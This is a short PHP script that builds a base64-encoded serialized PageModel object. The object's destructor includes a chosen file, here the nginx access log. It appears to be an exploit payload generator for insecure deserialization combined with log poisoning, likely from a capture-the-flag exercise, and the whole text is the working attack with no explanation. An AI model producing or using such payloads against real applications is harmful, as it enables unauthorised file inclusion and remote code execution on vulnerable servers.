<?php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
$page = new PageModel;
$page->file='/var/log/nginx/access.log';
print_r(base64_encode(serialize($page)));

